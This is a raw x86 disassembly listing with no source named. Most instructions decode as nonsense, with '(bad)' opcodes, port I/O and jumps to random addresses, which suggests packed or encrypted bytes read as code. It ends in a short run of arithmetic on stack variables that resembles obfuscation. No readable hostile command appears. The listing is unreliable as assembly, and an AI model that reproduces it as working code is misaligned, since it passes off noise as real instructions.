  4164f2:	or     al,0xa9
  4164f4:	sti    
  4164f5:	call   0x18d59ae
  4164fa:	xchg   esi,eax
  4164fb:	out    0xb2,al
  4164fd:	xor    edx,DWORD PTR [ebx+0x4f]
  416500:	mov    esp,0x6fd274cf
  416505:	push   esi
  416506:	dec    ecx
  416507:	mov    ds:0xd70b54e5,al
  41650c:	dec    ecx
  41650d:	ret    0x145
  416510:	jb     0x416581
  416512:	inc    ecx
  416513:	or     al,0x29
  416515:	and    ebx,DWORD PTR [edx-0x43]
  416518:	in     eax,dx
  416519:	ret    0x5a2f
  41651c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41651d:	out    dx,eax
  41651e:	lods   eax,DWORD PTR ds:[esi]
  41651f:	push   0xd308ed
  416524:	cmp    eax,0xd611eba0
  416529:	xlat   BYTE PTR ds:[ebx]
  41652a:	fdiv   DWORD PTR [edi-0x7bdc7133]
  416530:	inc    esp
  416531:	jae    0x416516
  416533:	retf   
  416534:	xor    DWORD PTR [edx-0x3b61228d],ebx
  41653a:	mov    eax,ds:0xf169166
  41653f:	div    ah
  416541:	mov    al,ds:0x5a7e576
  416546:	pop    esi
  416547:	test   al,0x75
  416549:	(bad)  
  41654b:	inc    edx
  41654c:	mov    ebp,0x7c775ce7
  416551:	push   eax
  416552:	mov    al,0x80
  416554:	(bad)  
  416555:	or     al,0xe2
  416557:	pop    ss
  416558:	cmp    dl,BYTE PTR [ebx]
  41655a:	cwde   
  41655b:	sub    ecx,DWORD PTR [edi+0x31]
  41655e:	xchg   ecx,eax
  41655f:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  416561:	out    dx,eax
  416562:	jo     0x41651b
  416564:	mov    ds:0x1e0cefe2,al
  416569:	jns    0x4164f8
  41656b:	xor    eax,0x27e563ce
  416570:	pushf  
  416571:	outs   dx,DWORD PTR ds:[esi]
  416572:	jecxz  0x416509
  416574:	pop    es
  416575:	inc    ah
  416577:	mov    WORD PTR [ebp+0x7d],ss
  41657a:	stos   DWORD PTR es:[edi],eax
  41657b:	std    
  41657c:	xor    ecx,DWORD PTR [esi-0x4]
  41657f:	xchg   edx,eax
  416580:	add    BYTE PTR cs:[ebx],dl
  416583:	fisub  DWORD PTR [eax-0x62]
  416586:	fisttp DWORD PTR [ebp+0xe]
  416589:	dec    esi
  41658a:	pop    esp
  41658b:	add    al,BYTE PTR [ecx+0x65]
  41658e:	cmp    BYTE PTR [edi+0x2850ee2d],0x69
  416595:	cmc    
  416596:	pop    eax
  416597:	mov    esp,0xfc175b75
  41659c:	mov    esp,0xfe1127fe
  4165a1:	mov    edi,ecx
  4165a3:	xchg   ebx,eax
  4165a4:	in     eax,dx
  4165a5:	jb     0x416529
  4165a7:	das    
  4165a8:	std    
  4165a9:	mov    bh,BYTE PTR [eax-0x7]
  4165ac:	inc    ebp
  4165ad:	jecxz  0x4165b4
  4165af:	(bad)  
  4165b1:	mov    dl,0xc5
  4165b3:	ins    DWORD PTR es:[edi],dx
  4165b4:	out    0x0,eax
  4165b6:	dec    edi
  4165b7:	ror    dh,cl
  4165b9:	xchg   edi,eax
  4165ba:	rcr    DWORD PTR [ebx],cl
  4165bc:	add    BYTE PTR [ebx-0x12],dl
  4165bf:	jae    0x416631
  4165c1:	dec    edi
  4165c2:	push   esp
  4165c3:	or     al,0xe1
  4165c5:	ret    
  4165c6:	or     BYTE PTR [ebp+0x7b],0xcb
  4165ca:	(bad)
  4165cf:	ins    DWORD PTR es:[edi],dx
  4165d0:	mov    ch,0x2c
  4165d2:	jp     0x416561
  4165d4:	fadd   st,st(1)
  4165d6:	or     DWORD PTR [ebp+0x5d8af4c5],eax
  4165dc:	lods   al,BYTE PTR ds:[esi]
  4165dd:	scas   al,BYTE PTR es:[edi]
  4165de:	push   esp
  4165df:	loopne 0x416650
  4165e1:	pop    esp
  4165e2:	in     al,0xf3
  4165e4:	(bad)  
  4165e5:	fisttp QWORD PTR [ebx-0x3bf812f1]
  4165eb:	icebp  
  4165ec:	fs or  eax,0xcac6e61f
  4165f2:	imul   edx,DWORD PTR [ebp+eax*1-0x7b051627],0xfffffff3
  4165fa:	repz jae 0x416580
  4165fd:	shl    DWORD PTR [esi-0xeef31c],0x9f
  416604:	jmp    0x41659c
  416606:	fsubr  st,st(2)
  416608:	out    dx,eax
  416609:	iret   
  41660a:	pop    edx
  41660b:	inc    ecx
  41660c:	sbb    edx,DWORD PTR [esi+0x1c115049]
  416612:	push   edx
  416613:	lahf   
  416614:	sub    al,0x1f
  416616:	xchg   esi,eax
  416617:	iret   
  416618:	pop    ebp
  416619:	jmp    0x34fb:0xb0ebe4cb
  416620:	pop    esi
  416621:	out    dx,al
  416622:	dec    edi
  416623:	aaa    
  416624:	arpl   WORD PTR [edx+0x36],ax
  416627:	cmp    ch,dl
  416629:	test   eax,0x92be817e
  41662e:	(bad)  
  41662f:	ins    DWORD PTR es:[edi],dx
  416630:	and    eax,0xa1584f21
  416635:	dec    esp
  416636:	in     al,0xd8
  416638:	add    al,0x45
  41663a:	dec    ecx
  41663b:	inc    edi
  41663c:	adc    eax,DWORD PTR [ecx+0x10]
  41663f:	inc    ebp
  416640:	cmp    DWORD PTR [ecx+0x70],0x354b4c14
  416647:	and    DWORD PTR ds:0xc3dab03d,esp
  41664d:	dec    edx
  41664e:	sbb    ah,BYTE PTR [ebx+0x0]
  416651:	adc    al,0xa8
  416653:	retf   
  416654:	mov    esp,0xc5e8b14
  416659:	xchg   ecx,eax
  41665a:	imul   eax,DWORD PTR [edi-0x4f],0x7753a5c9
  416661:	inc    esi
  416662:	js     0x41660f
  416664:	aam    0xc2
  416666:	cdq    
  416667:	out    0x76,eax
  416669:	pusha  
  41666a:	mov    al,0x50
  41666c:	jecxz  0x416657
  41666e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41666f:	jno    0x4166b6
  416671:	sub    al,0x15
  416673:	cli    
  416674:	or     ebx,esi
  416676:	js     0x416641
  416678:	jl     0x4166e6
  41667a:	jns    0x41664a
  41667c:	cmp    al,0xce
  41667e:	repnz mov dl,0x7e
  416681:	mov    esp,es
  416683:	or     al,0xb5
  416685:	jbe    0x4166c1
  416687:	ficom  WORD PTR [esi+0x7c66299c]
  41668d:	test   eax,0xc950a8a4
  416692:	test   DWORD PTR [eax+eax*2],esi
  416695:	outs   dx,BYTE PTR ds:[esi]
  416696:	add    ecx,DWORD PTR [ecx-0x7e]
  416699:	loope  0x4166d2
  41669b:	inc    eax
  41669c:	fstp   QWORD PTR [edx+0x735ac7dc]
  4166a2:	jae    0x416637
  4166a4:	inc    esp
  4166a5:	add    DWORD PTR [esi],esp
  4166a7:	dec    edx
  4166a8:	lea    edi,[esi+eiz*2-0x67559fcf]
  4166af:	clc    
  4166b0:	xor    ecx,ebx
  4166b2:	push   ebx
  4166b3:	cmp    dl,BYTE PTR [eax-0x5c8173c9]
  4166b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166ba:	and    ecx,DWORD PTR [ebx-0x36242392]
  4166c0:	leave  
  4166c1:	(bad)  
  4166c2:	sub    ah,BYTE PTR [ebp+0x4a8336ec]
  4166c8:	les    edi,FWORD PTR [edx-0x5bf933ac]
  4166ce:	fst    QWORD PTR [esi+0x65]
  4166d1:	ret    
  4166d2:	(bad)  
  4166d3:	add    ebp,esp
  4166d5:	loopne 0x416686
  4166d7:	aam    0x2f
  4166d9:	std    
  4166da:	hlt    
  4166db:	mov    ecx,0xc1b3cc76
  4166e0:	pop    ebp
  4166e1:	sub    BYTE PTR [edx],bh
  4166e3:	sub    eax,0x796523b8
  4166e8:	adc    al,0xf5
  4166ea:	(bad)  
  4166eb:	mov    ds:0xe0279fd8,al
  4166f0:	mov    edx,0xdea2966f
  4166f5:	jae    0x416710
  4166f7:	neg    BYTE PTR [edi-0x7367cc97]
  4166fd:	inc    eax
  4166fe:	loope  0x416682
  416700:	leavew 
  416702:	es sub al,bl
  416705:	jmp    0xb74380d8
  41670a:	imul   eax,DWORD PTR ds:0xf742bc46,0x1b
  416711:	stc    
  416712:	sub    cl,BYTE PTR [eax]
  416714:	stos   BYTE PTR es:[edi],al
  416715:	mov    edi,?
  416717:	das    
  416718:	push   ebx
  416719:	jl     0x4166ec
  41671b:	xchg   edi,eax
  41671c:	xor    DWORD PTR [ebx-0x5f49419b],edx
  416722:	fnstsw WORD PTR [edx+0xb]
  416725:	lds    edx,FWORD PTR ds:0x7df98c59
  41672b:	or     eax,0xcec4080e
  416730:	dec    ecx
  416731:	jp     0x416752
  416733:	mov    esp,0xcd0ce21b
  416738:	mov    ebx,0x9e3fb89
  41673d:	aam    0x3e
  41673f:	dec    eax
  416740:	sub    al,0x3
  416742:	cmp    BYTE PTR [ebp+esi*8-0x7e],bh
  416746:	pop    edi
  416747:	aaa    
  416748:	(bad)  
  416749:	mov    ah,0xb5
  41674b:	outs   dx,DWORD PTR ds:[esi]
  41674c:	sbb    eax,0xd1422269
  416751:	dec    edi
  416752:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416753:	fist   DWORD PTR [ecx-0x6b]
  416756:	sbb    ah,BYTE PTR [ecx+eiz*4-0x75]
  41675a:	lods   eax,DWORD PTR ds:[esi]
  41675b:	sbb    BYTE PTR [esi+ebp*8+0x43],al
  41675f:	lods   al,BYTE PTR ds:[esi]
  416760:	stos   BYTE PTR es:[edi],al
  416761:	inc    ebp
  416762:	loopne 0x416735
  416764:	cmp    eax,0x66737a58
  416769:	mov    dl,BYTE PTR [ecx+0xedc322b]
  41676f:	aam    0x87
  416771:	push   edx
  416772:	ret    0xf0c
  416775:	xchg   esp,eax
  416776:	mov    edx,0x7a8dd00b
  41677b:	fcomi  st,st(3)
  41677d:	jge    0x4167e0
  41677f:	stos   DWORD PTR es:[edi],eax
  416780:	das    
  416781:	pushf  
  416782:	inc    eax
  416783:	sbb    eax,0xc1ae386c
  416788:	mov    eax,0xbf53bf54
  41678d:	jmp    0x4167c6
  41678f:	lahf   
  416790:	(bad)  
  416791:	popa   
  416792:	and    DWORD PTR [edx-0xbc36a61],eax
  416798:	sahf   
  416799:	jae    0x416808
  41679b:	enter  0xab2d,0xde
  41679f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167a0:	add    eax,0xa98c826e
  4167a5:	mov    eax,ds:0x2ccab69c
  4167aa:	sub    BYTE PTR [edi+0x2c],bl
  4167ad:	je     0x4167ec
  4167af:	pop    ebp
  4167b0:	push   esi
  4167b1:	mov    dl,0x98
  4167b3:	shr    BYTE PTR [ebx],0x1a
  4167b6:	push   esi
  4167b7:	not    DWORD PTR [ecx+edi*2]
  4167ba:	sub    BYTE PTR [eax],ah
  4167bc:	mov    bh,BYTE PTR [eax+esi*8]
  4167bf:	loope  0x4167e5
  4167c1:	popf   
  4167c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167c3:	jnp    0x416768
  4167c5:	mov    BYTE PTR [ecx+0x5be6def4],bl
  4167cb:	mov    edi,0x559a080b
  4167d0:	jg     0x416836
  4167d2:	int    0x55
  4167d4:	xchg   edx,eax
  4167d5:	icebp  
  4167d6:	and    eax,0x8e79bdec
  4167db:	jle    0x4167dc
  4167dd:	add    esi,ebx
  4167df:	in     eax,dx
  4167e0:	or     eax,0xec7cc4d4
  4167e5:	add    BYTE PTR [esi+0x606144af],0x7f
  4167ec:	add    eax,DWORD PTR [eax+0x3b]
  4167ef:	inc    eax
  4167f0:	jns    0x4167d9
  4167f2:	pushf  
  4167f3:	mov    ebp,0x48cf7a59
  4167f8:	gs dec ebx
  4167fa:	add    al,0x7e
  4167fc:	in     eax,dx
  4167fd:	xchg   ebx,eax
  4167fe:	ret    0x4f0
  416801:	mov    ebp,0xd8dff5c
  416806:	adc    al,0xf5
  416808:	pop    edi
  416809:	push   edx
  41680a:	add    ch,al
  41680c:	jmp    0x7c83518
  416811:	sub    al,0x8d
  416813:	lods   eax,DWORD PTR ds:[esi]
  416814:	nop    esp
  416817:	inc    eax
  416818:	and    eax,0x43e9ed3a
  41681d:	pop    esp
  41681e:	fist   DWORD PTR [edx]
  416820:	lahf   
  416821:	outs   dx,BYTE PTR ds:[esi]
  416822:	test   BYTE PTR [edx-0x3a96329a],bh
  416828:	mov    ch,0x2b
  41682a:	cmp    bh,bl
  41682c:	std    
  41682d:	add    al,0x81
  41682f:	push   es
  416830:	clc    
  416831:	jmp    0x749e993a
  416836:	add    ecx,DWORD PTR [esi-0x38b3604e]
  41683c:	cli    
  41683d:	addr16 (bad) 
  41683f:	mov    dh,0x29
  416841:	ss ret 
  416843:	data16 das 
  416845:	sbb    BYTE PTR [eax-0x7b4a4a70],ch
  41684b:	sbb    DWORD PTR [ebx-0x5d3b919d],eax
  416851:	or     eax,ebx
  416853:	test   al,0x8e
  416856:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416857:	sbb    ah,0x52
  41685a:	xchg   esi,eax
  41685b:	shl    BYTE PTR fs:[esi],cl
  41685e:	or     eax,0x3f001fed
  416863:	mov    bl,0x30
  416865:	xchg   eax,esi
  416867:	cmp    DWORD PTR [eax-0x15ad75b6],edx
  41686d:	iret   
  41686e:	xor    eax,0xbfe938b8
  416873:	leave  
  416874:	div    BYTE PTR [edi+0x42]
  416877:	ins    DWORD PTR es:[edi],dx
  416878:	fsubr  QWORD PTR [ebx-0x3d0e1078]
  41687e:	popf   
  41687f:	jnp    0x416889
  416881:	dec    al
  416883:	mov    DWORD PTR [ecx+0x44],esp
  416886:	clc    
  416887:	ret    
  416888:	enter  0xee5d,0x63
  41688c:	bound  esi,QWORD PTR [edx+esi*2-0x41]
  416890:	(bad)  
  416891:	mov    dl,0x86
  416893:	repnz cmp BYTE PTR [ebp*2+0x3094be5a],bl
  41689b:	sbb    ah,BYTE PTR ds:0xa17ba1af
  4168a1:	pop    esi
  4168a2:	(bad)  
  4168a3:	xchg   ebx,eax
  4168a4:	fiadd  DWORD PTR [esi]
  4168a6:	push   DWORD PTR [edx+0x6babb25d]
  4168ac:	lea    eax,ds:0xe44d0140
  4168b2:	push   esp
  4168b3:	fisub  DWORD PTR [edx+0x48406131]
  4168b9:	scas   eax,DWORD PTR es:[edi]
  4168ba:	call   0x9e66540c
  4168bf:	or     BYTE PTR [edi],bl
  4168c1:	mov    esp,0x4f3a7f20
  4168c6:	sahf   
  4168c7:	enter  0x7fa4,0x8f
  4168cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4168cc:	pop    es
  4168cd:	mov    WORD PTR [edi-0x3],ss
  4168d0:	pop    ds
  4168d1:	je     0x41691d
  4168d3:	inc    esp
  4168d4:	leave  
  4168d5:	enter  0xc990,0xf6
  4168d9:	mov    dl,0x10
  4168db:	int3   
  4168dc:	retf   
  4168dd:	inc    esp
  4168de:	inc    esp
  4168df:	mov    edi,0xb7095ae1
  4168e4:	adc    eax,0xdf61b1aa
  4168e9:	pop    es
  4168ea:	(bad)  
  4168eb:	call   0xde8ee59d
  4168f0:	sbb    edi,DWORD PTR [ebx]
  4168f2:	retf   
  4168f3:	cmp    BYTE PTR [ebx-0x1e],ah
  4168f6:	fadd   DWORD PTR [ecx]
  4168f8:	pop    ecx
  4168f9:	inc    ebx
  4168fa:	(bad)
  4168ff:	xchg   edi,eax
  416900:	popa   
  416901:	mul    bl
  416903:	cli    
  416904:	js     0x41693d
  416906:	(bad)  
  416907:	in     eax,dx
  416908:	xor    DWORD PTR [eax-0x7d],0x8abbe620
  41690f:	mov    ch,0x61
  416911:	inc    edi
  416912:	mov    ebp,0x6fdc73ea
  416917:	in     eax,dx
  416918:	xchg   ebp,eax
  416919:	cli    
  41691a:	stos   DWORD PTR es:[edi],eax
  41691b:	cli    
  41691c:	(bad)  
  41691d:	or     BYTE PTR [bx+di+0x2d],dh
  416921:	ret    0xcd2f
  416924:	out    dx,al
  416925:	xchg   esi,eax
  416926:	icebp  
  416927:	pop    edx
  416928:	sbb    edi,DWORD PTR [esi+eax*2+0x32]
  41692c:	mov    eax,ds:0x4580a6dd
  416931:	adc    eax,0x88bf3d3a
  416936:	test   ch,bl
  416938:	mov    ebp,0x361dc7c6
  41693d:	or     esp,eax
  41693f:	aad    0xb6
  416941:	xor    BYTE PTR [ecx+0x4de7e086],bh
  416947:	pop    edx
  416948:	mov    edx,0x7a779989
  41694d:	xchg   ebx,eax
  41694e:	mov    dh,0x59
  416950:	jnp    0x4169c3
  416952:	das    
  416953:	cld    
  416954:	cs jmp 0x6498:0xc417d63
  41695c:	mov    edi,0xd3765c92
  416961:	jns    0x4169d6
  416963:	sti    
  416964:	and    dl,BYTE PTR [edx+0x39]
  416967:	cmp    eax,0x5dfef498
  41696c:	cld    
  41696d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41696e:	fsub   st,st(6)
  416970:	rcr    bl,cl
  416972:	xor    al,0x8a
  416974:	call   0xcbe86021
  416979:	psrlq  mm6,mm2
  41697c:	jno    0x416970
  41697e:	sbb    DWORD PTR [eax],ebp
  416980:	stos   DWORD PTR es:[edi],eax
  416981:	call   0x33a7:0xa3fc8b33
  416988:	loope  0x4169f7
  41698a:	ins    DWORD PTR es:[edi],dx
  41698b:	sub    eax,0x5818d6c5
  416990:	popa   
  416991:	cdq    
  416992:	push   cs
  416993:	sub    BYTE PTR [ebp-0x33],dl
  416996:	mov    ah,0xbe
  416998:	jno    0x41691d
  41699a:	pop    ebx
  41699b:	sbb    BYTE PTR [ebx-0x77005321],bl
  4169a1:	and    BYTE PTR [edi+edx*8],bh
  4169a4:	out    0xd4,eax
  4169a6:	jg     0x4169ec
  4169a8:	test   DWORD PTR [edx],0x91e95a8c
  4169ae:	xchg   esp,eax
  4169af:	mov    WORD PTR [edi+0x7f],fs
  4169b2:	(bad)  
  4169b3:	sbb    al,0xd9
  4169b5:	fistp  QWORD PTR [ebp-0x8]
  4169b8:	int3   
  4169b9:	out    dx,eax
  4169ba:	mov    al,0xb0
  4169bc:	and    al,0xea
  4169be:	data16 test al,0xec
  4169c1:	mov    esp,0x74ee8b87
  4169c6:	call   0xe2826d2
  4169cb:	or     al,bl
  4169cd:	hlt    
  4169ce:	add    DWORD PTR [eax],0xffffffc8
  4169d1:	cld    
  4169d2:	out    dx,eax
  4169d3:	ja     0x416a31
  4169d5:	add    DWORD PTR ds:[eiz*2+0x15f951e9],0x1b5a6ad1
  4169e1:	lahf   
  4169e2:	clc    
  4169e3:	pop    ebp
  4169e4:	jg     0x416a4a
  4169e6:	jp     0x416a35
  4169e8:	popa   
  4169e9:	stc    
  4169ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169eb:	js     0x416979
  4169ed:	rol    BYTE PTR [ebx+0x2a],cl
  4169f0:	test   BYTE PTR [edi+0x2e],al
  4169f3:	add    al,0x42
  4169f5:	and    al,0x1c
  4169f7:	std    
  4169f8:	dec    ebx
  4169f9:	and    bl,BYTE PTR [eax+0x7d]
  4169fc:	pop    ss
  4169fd:	xor    DWORD PTR [eax-0x3c4621ee],ebp
  416a03:	push   eax
  416a04:	xchg   edi,eax
  416a05:	sub    al,0xb9
  416a07:	mov    eax,0xeaf931aa
  416a0c:	jg     0x4169c2
  416a0e:	push   edx
  416a0f:	out    0xcb,al
  416a11:	jno    0x4169ca
  416a13:	cmp    dl,BYTE PTR [esi]
  416a15:	into   
  416a16:	out    dx,al
  416a17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a18:	out    0xe3,eax
  416a1a:	aaa    
  416a1b:	out    dx,al
  416a1c:	fadd   QWORD PTR [edx]
  416a1e:	push   eax
  416a1f:	or     bl,dl
  416a21:	sub    eax,0x17df3c61
  416a26:	scas   eax,DWORD PTR es:[edi]
  416a27:	mov    dh,0xd0
  416a29:	rcl    DWORD PTR [esi-0x64],1
  416a2c:	pusha  
  416a2d:	out    0x4c,al
  416a2f:	inc    ebp
  416a30:	fs inc ebp
  416a32:	cld    
  416a33:	inc    edx
  416a34:	out    0x14,eax
  416a36:	add    cl,BYTE PTR [ebx+0x7f]
  416a39:	sub    eax,0x1ef0b179
  416a3e:	sub    dh,BYTE PTR [ebx]
  416a40:	mov    ds:0xefc6190a,al
  416a45:	aas    
  416a46:	push   eax
  416a47:	jo     0x416a3f
  416a49:	mov    al,ds:0x54324bc2
  416a4e:	fimul  DWORD PTR [ebx]
  416a50:	push   eax
  416a51:	sub    dl,BYTE PTR [esi]
  416a53:	xchg   esp,eax
  416a54:	dec    eax
  416a55:	xor    ebp,DWORD PTR [edi+0x6a]
  416a58:	loopne 0x4169e3
  416a5a:	cld    
  416a5b:	daa    
  416a5c:	inc    edx
  416a5d:	xor    dl,bh
  416a5f:	loop   0x416aa1
  416a61:	add    ebx,eax
  416a63:	xchg   esp,ecx
  416a65:	into   
  416a66:	jae    0x416a86
  416a68:	es ss (bad) 
  416a6b:	retf   
  416a6c:	icebp  
  416a6d:	inc    esp
  416a6e:	pop    esp
  416a6f:	enter  0xf057,0x83
  416a73:	dec    esp
  416a74:	adc    DWORD PTR [ecx-0x32ef4787],ebx
  416a7a:	outs   dx,BYTE PTR ds:[esi]
  416a7b:	mov    ecx,DWORD PTR [ebp+0x48c213f9]
  416a81:	add    eax,0x8e86d04c
  416a86:	retf   0xd5dc
  416a89:	call   0xe6ce29c0
  416a8e:	xchg   BYTE PTR [eax+0x71],bh
  416a91:	xchg   ebx,eax
  416a92:	stc    
  416a93:	lods   eax,DWORD PTR ds:[esi]
  416a94:	pop    ebp
  416a95:	xchg   ebp,eax
  416a96:	imul   bh
  416a98:	jae    0x416a32
  416a9a:	push   ss
  416a9b:	test   al,0xf0
  416a9d:	fnstsw WORD PTR [edi+ecx*1-0x2b2681f3]
  416aa4:	in     al,0xa7
  416aa6:	pop    ebp
  416aa7:	dec    edx
  416aa8:	iret   
  416aa9:	test   al,0x89
  416aab:	jne    0x416ab9
  416aad:	lds    ebx,FWORD PTR [ecx-0x35]
  416ab0:	lahf   
  416ab1:	add    eax,0xaac43e28
  416ab6:	xchg   ebp,eax
  416ab7:	push   ecx
  416ab8:	cli    
  416ab9:	sahf   
  416aba:	jp     0x416aa8
  416abc:	xor    DWORD PTR [ecx+ebp*1-0x12],edx
  416ac0:	inc    ebp
  416ac1:	les    ebp,FWORD PTR [ebp+0x292c8fe0]
  416ac7:	or     edi,DWORD PTR [eax-0x70dcd235]
  416acd:	inc    edx
  416ace:	add    eax,0x5f137ce0
  416ad3:	inc    eax
  416ad4:	into   
  416ad5:	mov    dh,0x5
  416ad7:	cs popa 
  416ad9:	ror    BYTE PTR [edi+0x1e],cl
  416adc:	cld    
  416add:	call   0xbac:0xc27728e8
  416ae4:	je     0x416a73
  416ae6:	ins    DWORD PTR es:[edi],dx
  416ae7:	mov    dh,0x3a
  416ae9:	jne    0x416a7c
  416aeb:	sti    
  416aec:	xor    bh,BYTE PTR [ecx+esi*8+0x6c]
  416af0:	ins    BYTE PTR es:[edi],dx
  416af1:	push   ss
  416af2:	out    0x75,eax
  416af4:	add    eax,DWORD PTR [edi+0x2a8a8204]
  416afa:	sub    ebx,DWORD PTR [eax]
  416afc:	mov    ah,0x8e
  416afe:	dec    esp
  416aff:	sub    BYTE PTR [ecx],al
  416b01:	adc    esi,ebp
  416b03:	in     al,dx
  416b04:	inc    edx
  416b05:	adc    eax,0x10b180b5
  416b0a:	or     al,0xe1
  416b0c:	pop    esp
  416b0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b0e:	jne    0x416afb
  416b10:	rcl    esi,0xb4
  416b13:	dec    edx
  416b14:	loop   0x416acd
  416b16:	or     ebp,0x633eb85e
  416b1c:	jg     0x416aa9
  416b1e:	mov    ds:0x11de01f,al
  416b23:	or     DWORD PTR [edx+ebx*4-0x681211e0],edi
  416b2a:	imul   ebp,DWORD PTR ds:0x558e734f,0xd3f7e215
  416b34:	in     al,0x99
  416b36:	inc    ecx
  416b37:	xor    eax,0x48cd1371
  416b3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b3d:	cmc    
  416b3e:	ja     0x416b48
  416b40:	sub    al,0xda
  416b42:	fst    st(4)
  416b44:	mov    WORD PTR [edx],ds
  416b46:	mov    gs,WORD PTR [eax+0x5157d65c]
  416b4c:	addr16 push edi
  416b4e:	and    edi,ebp
  416b50:	or     eax,0xa67d65b0
  416b55:	xchg   ebp,eax
  416b56:	ret    0xa63a
  416b59:	pop    ebx
  416b5a:	fcomp  DWORD PTR [ebx+ecx*4]
  416b5d:	mov    ebp,0xbe930610
  416b62:	sub    eax,edi
  416b64:	cmc    
  416b65:	mov    al,ah
  416b67:	mov    ecx,0x89b1f588
  416b6c:	aas    
  416b6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b6e:	xor    bh,bh
  416b70:	mov    ds:0x7294e03,eax
  416b75:	xor    ah,al
  416b77:	xor    eax,0x80520b24
  416b7c:	or     al,0xc6
  416b7e:	mov    ecx,0x8fc68634
  416b83:	test   al,0x95
  416b85:	loop   0x416b9d
  416b87:	je     0x416b6b
  416b89:	addr16 test al,0xa3
  416b8c:	mov    dh,ah
  416b8e:	mov    ah,0xef
  416b90:	jmp    DWORD PTR [ecx-0x56]
  416b93:	bound  edx,QWORD PTR [esi]
  416b95:	jmp    0x416c10
  416b97:	adc    al,0xc
  416b99:	out    0x17,al
  416b9b:	mov    fs,WORD PTR [ecx+0x76042c07]
  416ba1:	nop
  416ba2:	call   0x2554bb74
  416ba7:	cmp    al,0xf7
  416ba9:	repz mov esp,0xdfd9bb9c
  416baf:	mov    ebx,0x8e68d1bf
  416bb4:	add    ebx,DWORD PTR [esi+0x59]
  416bb7:	imul   ebp,eax,0x6ecbfdd7
  416bbd:	dec    esp
  416bbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bbf:	dec    edi
  416bc0:	jge    0x416bb7
  416bc2:	out    0xdf,al
  416bc4:	jg     0x416c09
  416bc6:	jmp    0xb48143ef
  416bcb:	outs   dx,DWORD PTR ds:[esi]
  416bcc:	jg     0x416bd4
  416bce:	mov    dh,0x53
  416bd0:	push   0x1e
  416bd2:	jmp    0x1051:0xe1dbd593
  416bd9:	lahf   
  416bda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416bdb:	mov    cs,ebx
  416bdd:	add    DWORD PTR [edx],ebx
  416bdf:	fstp   TBYTE PTR [esi+0x42]
  416be2:	imul   BYTE PTR ds:0x2cba8ca7
  416be8:	call   0xf96d:0x322b43ff
  416bef:	or     BYTE PTR [edi+0x20],dh
  416bf2:	cmc    
  416bf3:	imul   ebp,DWORD PTR [ecx+eax*2+0x12b34868],0xffffff8f
  416bfb:	inc    edx
  416bfc:	mov    ah,0x87
  416bfe:	(bad)  
  416bff:	and    esi,eax
  416c01:	mov    gs,edi
  416c03:	mov    eax,0x67ec4894
  416c08:	dec    edx
  416c09:	or     eax,0xd5766ab6
  416c0e:	add    ecx,DWORD PTR [ecx+0x39871abe]
  416c14:	fwait
  416c15:	stos   BYTE PTR es:[edi],al
  416c16:	dec    DWORD PTR [edx-0x247e1ea8]
  416c1c:	adc    ch,BYTE PTR [ecx]
  416c1e:	psubsb mm5,QWORD PTR [ecx]
  416c21:	(bad)  
  416c22:	fmul   DWORD PTR [eax-0x2eecaf4a]
  416c28:	mov    edi,0xe650601b
  416c2d:	xchg   ebx,eax
  416c2e:	std    
  416c2f:	push   ebp
  416c30:	clc    
  416c31:	or     bl,ah
  416c33:	adc    edx,DWORD PTR [edx-0x48ae29c]
  416c39:	ror    BYTE PTR [ebx+ebp*4],0x56
  416c3d:	(bad)  
  416c3e:	mov    ebx,0x29d4bf4c
  416c43:	cli    
  416c44:	pop    ebp
  416c45:	outs   dx,DWORD PTR ds:[esi]
  416c46:	nop
  416c47:	fmulp  st(7),st
  416c49:	int3   
  416c4a:	push   es
  416c4b:	ins    DWORD PTR es:[edi],dx
  416c4c:	xor    ah,ch
  416c4e:	cwde   
  416c4f:	sub    eax,0xdf0febfe
  416c54:	inc    edi
  416c55:	fnsave [eax+0x5d953cae]
  416c5b:	das    
  416c5c:	xlat   BYTE PTR ds:[ebx]
  416c5d:	(bad)  
  416c5e:	cmp    BYTE PTR [ecx+0x78],cl
  416c61:	jp     0x416cd5
  416c63:	scas   eax,DWORD PTR es:[edi]
  416c64:	cmp    BYTE PTR [edx+0x368fe15a],0xb4
  416c6b:	outs   dx,BYTE PTR ds:[esi]
  416c6c:	inc    ebx
  416c6d:	out    dx,al
  416c6e:	sbb    esp,ebx
  416c70:	xchg   DWORD PTR [eax],edi
  416c72:	push   esi
  416c73:	loope  0x416c5e
  416c75:	xchg   ebp,eax
  416c76:	btc    ebx,eax
  416c79:	mov    ebp,0x484437ab
  416c7e:	jle    0x416cfd
  416c80:	sub    WORD PTR [edi+0x973e049],sp
  416c87:	(bad)  
  416c88:	sub    ebp,DWORD PTR [esi-0x4e4fe496]
  416c8e:	test   eax,0xf85d8b92
  416c93:	xor    edx,eax
  416c95:	xor    ebx,eax
  416c97:	sub    edx,ebx
  416c99:	sub    edx,esi
  416c9b:	xor    edx,eax
  416c9d:	mov    DWORD PTR [ebp+0x8],edx
  416ca0:	mov    edx,DWORD PTR [ebp+0x8]
  416ca3:	mov    ebx,DWORD PTR [ebp-0x58]
  416ca6:	add    edx,0x5708e2
  416cac:	imul   edx,ebx
  416caf:	mov    DWORD PTR [ebp-0x58],edx
  416cb2:	mov    edx,DWORD PTR [ebp+0x8]
  416cb5:	mov    ebx,DWORD PTR [ebp-0x54]
  416cb8:	add    edx,0x64f880
  416cbe:	or     edx,ebx
  416cc0:	mov    DWORD PTR [ebp-0x54],edx
  416cc3:	mov    edx,DWORD PTR [ebp+0x8]
